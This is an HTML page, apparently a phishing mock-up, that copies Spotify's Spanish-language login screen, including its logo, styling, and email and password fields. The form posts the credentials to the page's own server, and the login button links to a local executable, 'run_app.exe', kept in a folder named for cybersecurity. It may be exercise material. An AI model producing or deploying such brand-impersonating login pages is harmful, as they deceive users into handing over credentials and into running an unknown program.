<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Iniciar sesión en Spotify</title>
    <style>
      /* Reset */
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      body, html {
        height: 100%;
        font-family: 'Circular', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        background: linear-gradient(135deg, #1db954 0%, #1ed760 100%);
        color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .container {
        background-color: #000;
        width: 360px;
        padding: 40px 40px 60px;
        border-radius: 8px;
        box-shadow: 0 8px 24px rgba(0,0,0,0.6);
        text-align: center;
      }
      .logo {
        margin-bottom: 30px;
      }
      .logo img {
        width: 120px;
        height: auto;
      }
      h1 {
        font-weight: 700;
        font-size: 2rem;
        margin-bottom: 30px;
      }
      form {
        display: flex;
        flex-direction: column;
        gap: 20px;
      }
      input[type="text"],
      input[type="password"] {
        padding: 14px 16px;
        border-radius: 25px;
        border: none;
        font-size: 1rem;
        outline: none;
        transition: box-shadow 0.3s ease;
      }
      input[type="text"]:focus,
      input[type="password"]:focus {
        box-shadow: 0 0 8px #1db954;
      }
      button {
        background-color: #1db954;
        border: none;
        border-radius: 25px;
        padding: 14px 0;
        font-size: 1.1rem;
        font-weight: 700;
        color: #000;
        cursor: pointer;
        transition: background-color 0.3s ease;
      }
      button:hover {
        background-color: #17a44c;
      }
      .options {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 0.9rem;
        margin-top: -10px;
        margin-bottom: 20px;
        color: #b3b3b3;
      }
      .options label {
        display: flex;
        align-items: center;
        gap: 6px;
        cursor: pointer;
      }
      .options input[type="checkbox"] {
        width: 16px;
        height: 16px;
        cursor: pointer;
      }
      a {
        color: #1db954;
        text-decoration: none;
        font-weight: 600;
      }
      a:hover {
        text-decoration: underline;
      }
      .signup {
        margin-top: 30px;
        font-size: 0.9rem;
        color: #b3b3b3;
      }
      .signup a {
        color: #fff;
        font-weight: 700;
      }
      
      /* Responsive */
      @media (max-width: 400px) {
        .container {
          width: 90%;
          padding: 30px 20px 50px;
        }
      }
    </style>
  </head>
  <body>
    <div class="container" role="main" aria-label="Formulario de inicio de sesión de Spotify">
      <div class="logo" aria-label="Logo de Spotify">
        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_CMYK_Green.png" alt="Spotify" />
      </div>
      <h1>Iniciar sesión en Spotify</h1>
      <form id="loginForm" method="POST" action="/">
        <input type="text" id="email" name="email" placeholder="Correo electrónico o nombre de usuario" required aria-required="true" aria-label="Correo electrónico o nombre de usuario" />
        <input type="password" id="password" name="password" placeholder="Contraseña" required aria-required="true" aria-label="Contraseña" />
        <div class="options">
          <label for="remember">
            <input type="checkbox" id="remember" name="remember" />
            Recuérdame
          </label>
          <a href="#" tabindex="0">¿Olvidaste tu contraseña?</a>
        </div>
        <a href="C:\Users\Personal\Desktop\Ciberseguridad\dist\run_app.exe" style="text-decoration: none;">
        <button type="button">Iniciar sesión</button>
        </a>
      </form>
      <div class="signup">
        ¿No tienes una cuenta? <a href="#" tabindex="0">Regístrate gratis</a>
      </div>
    </div>
  </body>
  </html>
